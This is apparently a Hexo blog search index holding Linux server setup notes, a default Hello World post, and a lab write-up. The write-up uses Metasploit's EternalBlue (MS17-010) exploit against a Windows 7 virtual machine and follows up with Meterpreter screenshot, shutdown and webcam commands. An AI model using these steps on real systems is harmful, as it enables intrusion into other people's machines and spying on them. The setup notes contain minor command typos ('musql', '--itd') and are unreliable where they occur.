<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>note_1</title>
    <url>/2020/04/27/note-1/</url>
    <content><![CDATA[<h3 id="Linux系统搭建配置-1-软件入门（真-·-水文章）"><a href="#Linux系统搭建配置-1-软件入门（真-·-水文章）" class="headerlink" title="Linux系统搭建配置 1.. 软件入门（真 · 水文章）"></a>Linux系统搭建配置 1.. 软件入门（真 · 水文章）</h3><p>（以Ubuntu为例）</p>
<h4 id="搭建SSH服务"><a href="#搭建SSH服务" class="headerlink" title="搭建SSH服务"></a>搭建SSH服务</h4><h6 id="1、安装ssh服务"><a href="#1、安装ssh服务" class="headerlink" title="1、安装ssh服务"></a>1、安装ssh服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">ssh</span></code></pre>
<h6 id="2、启动-停止-查看服务"><a href="#2、启动-停止-查看服务" class="headerlink" title="2、启动/停止/查看服务"></a>2、启动/停止/查看服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">service</span> <span class="token function">ssh</span> start/stop/status</code></pre>
<h6 id="3、配置ssh服务"><a href="#3、配置ssh服务" class="headerlink" title="3、配置ssh服务"></a>3、配置ssh服务</h6><p>/etc/ssh/sshd_config<br><strong><em>一般使用环境</em></strong></p>
<ul>
<li>不允许root登录</li>
<li>只允许证书方式登录</li>
<li>更改ssh端口</li>
</ul>
<hr>
<h4 id="搭建apache服务"><a href="#搭建apache服务" class="headerlink" title="搭建apache服务"></a>搭建apache服务</h4><h6 id="1、安装apache服务"><a href="#1、安装apache服务" class="headerlink" title="1、安装apache服务"></a>1、安装apache服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">apt-get</span> <span class="token function">install</span> apache2</code></pre>
<h6 id="2、启动-停止-查看服务-1"><a href="#2、启动-停止-查看服务-1" class="headerlink" title="2、启动/停止/查看服务"></a>2、启动/停止/查看服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">service</span> apache2 start/stop/status</code></pre>
<h6 id="3、配置apache服务"><a href="#3、配置apache服务" class="headerlink" title="3、配置apache服务"></a>3、配置apache服务</h6><ul>
<li>/etc/apache2/apache2.conf（主配置文件）</li>
<li>/etc/apache2/conf-*（其余配置文件）</li>
<li>/etc/apache2/sites-*（虚拟主机配置文件）</li>
</ul>
<p><strong><em>常用命令</em></strong></p>
<pre class=" language-bash"><code class="language-bash">$ a2 + disconf/dismod/dissite/enconf/enmod/ensite/<span class="token punctuation">..</span>.</code></pre>
<hr>
<h4 id="搭建mysql服务"><a href="#搭建mysql服务" class="headerlink" title="搭建mysql服务"></a>搭建mysql服务</h4><h6 id="1、安装mysql"><a href="#1、安装mysql" class="headerlink" title="1、安装mysql"></a>1、安装mysql</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">apt-get</span> <span class="token function">install</span> mysql-server mysql-client</code></pre>
<h6 id="2、启动-暂停-查看服务"><a href="#2、启动-暂停-查看服务" class="headerlink" title="2、启动/暂停/查看服务"></a>2、启动/暂停/查看服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">service</span> mysql start/stop/status</code></pre>
<h6 id="3、配置mysql服务"><a href="#3、配置mysql服务" class="headerlink" title="3、配置mysql服务"></a>3、配置mysql服务</h6><ul>
<li>/etc/mysql/mysql.conf.d/mysqld.cnf（配置文件）</li>
<li>常用配置项 -&gt; bind-address（设置mysql请求的ip）</li>
</ul>
<h6 id="4、进入mysql命令行模式"><a href="#4、进入mysql命令行模式" class="headerlink" title="4、进入mysql命令行模式"></a>4、进入mysql命令行模式</h6><pre class=" language-bash"><code class="language-bash">$ musql -u 用户名 -p</code></pre>
<hr>
<h4 id="Docker（镜像-容器-仓库）"><a href="#Docker（镜像-容器-仓库）" class="headerlink" title="Docker（镜像+容器+仓库）"></a>Docker（镜像+容器+仓库）</h4><h6 id="1、安装docker"><a href="#1、安装docker" class="headerlink" title="1、安装docker"></a>1、安装docker</h6><p><strong><em>具体指令可直接网上查找</em></strong><br>此处用的是kali系统下安装，可参考下帖（表示很喜欢里面的仓鼠）<br>More: <a href="https://www.cnblogs.com/L0ading/p/12312413.html" target="_blank" rel="noopener">https://www.cnblogs.com/L0ading/p/12312413.html</a></p>
<h6 id="2、启动-暂停-查看服务-1"><a href="#2、启动-暂停-查看服务-1" class="headerlink" title="2、启动/暂停/查看服务"></a>2、启动/暂停/查看服务</h6><pre class=" language-bash"><code class="language-bash">$ <span class="token function">service</span> docker start/stop/status</code></pre>
<h6 id="3、Docker跑起？"><a href="#3、Docker跑起？" class="headerlink" title="3、Docker跑起？"></a>3、Docker跑起？</h6><pre class=" language-bash"><code class="language-bash">$ docker run --itd --name myname -p 8080:80 ubuntu</code></pre>
<ul>
<li>-it    给予一个交互式操作终端</li>
<li>-d     后台运行</li>
<li>–name 容器名称</li>
<li>-p     端口映射</li>
</ul>
<h6 id="4、进入docker命令行模式"><a href="#4、进入docker命令行模式" class="headerlink" title="4、进入docker命令行模式"></a>4、进入docker命令行模式</h6><pre class=" language-bash"><code class="language-bash">$ docker <span class="token function">exec</span> -it myname <span class="token function">pwd</span></code></pre>
<ul>
<li>-it    给予一个交互式终端执行命令</li>
</ul>
<p><strong>（到时再补补细节，估计又双叒叕要拖一下下了）</strong></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>第一次攻击实验</title>
    <url>/2020/04/15/ok/</url>
    <content><![CDATA[<p>实验:metasploit下利用”永恒之蓝”攻击win7<br>(准备阶段，win7虚拟机，kali linux系统)<br>实验声明:网络不是法外之地~~</p>
<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>初次使用 –&gt; msfdb init/reinit<br>开启数据库 –&gt; sudo service postgresql start</p>
<h5 id="msfconsole进入hexo"><a href="#msfconsole进入hexo" class="headerlink" title="msfconsole进入hexo"></a>msfconsole进入hexo</h5><p><img src="https://wx2.sbimg.cn/2020/04/15/p0.jpg" alt=""></p>
<h5 id="搜索cve17-010相关的exp"><a href="#搜索cve17-010相关的exp" class="headerlink" title="搜索cve17-010相关的exp"></a>搜索cve17-010相关的exp</h5><p>输入 –&gt; search ms17-010<br><img src="https://wx1.sbimg.cn/2020/04/15/p1.png" alt=""></p>
<h5 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h5><p>输入 –&gt; use auxiliary/scanner/smb/smb_ms17_010<br>使用options查看参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p2.png" alt=""></p>
<h5 id="关键来了，找了win7的IP，"><a href="#关键来了，找了win7的IP，" class="headerlink" title="关键来了，找了win7的IP，"></a>关键来了，找了win7的IP，</h5><p>输入 –&gt; set RHOSTS 192.168.XXX.XXX<br>接着 –&gt; run<br><img src="https://wx2.sbimg.cn/2020/04/15/p3.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p4.png" alt=""></p>
<p>接着 –&gt; use exploit/windows/smb/ms17_010_eternalblue<br>使用options查看相关参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p5.png" alt=""></p>
<p>然后 –&gt; set RHOSTS 192.168.XXX.XXX (靶机的IP)</p>
<h5 id="查看payload"><a href="#查看payload" class="headerlink" title="查看payload"></a>查看payload</h5><p>show payloads<br><img src="https://wx1.sbimg.cn/2020/04/15/p6.png" alt=""></p>
<h5 id="使用payload"><a href="#使用payload" class="headerlink" title="使用payload"></a>使用payload</h5><p>set payload (号数)<br>使用options查看payload要的参数<br><img src="https://wx2.sbimg.cn/2020/04/15/p7.png" alt=""></p>
<p>*设置本机IP –&gt; set LHOST 192.168.XXX.XXX</p>
<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><p>exploit<br><img src="https://wx2.sbimg.cn/2020/04/15/p8.png" alt=""><br><img src="https://wx1.sbimg.cn/2020/04/15/p9.png" alt=""></p>
<p>然后就可以进行截屏、关机、开摄像头等操作了,嘿嘿<br>截屏 –&gt; screenshot<br>关机 –&gt; shutdown<br>开摄像头 –&gt; webcam_scream<br><img src="https://wx2.sbimg.cn/2020/04/15/p10.png" alt=""></p>
<p>以下则是小实验的“偷窥”成果<br><img src="https://wx1.sbimg.cn/2020/04/15/p11.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p12.png" alt=""></p>
<p>老板觉得博文勉强过得去记得三连嘿，爱宁哟</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <tags>
        <tag>experiment</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/04/02/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
  </entry>
</search>
